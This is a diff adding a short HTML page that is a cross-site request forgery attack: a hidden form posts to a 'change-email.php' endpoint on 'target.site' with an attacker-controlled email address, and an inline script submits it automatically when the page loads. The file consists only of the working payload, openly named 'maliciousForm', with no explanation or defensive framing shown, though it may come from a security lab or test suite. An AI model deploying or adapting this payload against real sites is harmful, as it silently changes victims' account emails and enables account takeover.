@@ -1,0 +1,11 @@
+<html>
+<body>
+<form id="maliciousForm" action="http://target.site/change-email.php" method="post">
+	<input type="hidden" name="email" value="attacker@example.com">
+	<input type="submit">
+</form>
+<script>
+	document.getElementById("maliciousForm").submit();
+</script>
+</body>
+</html>
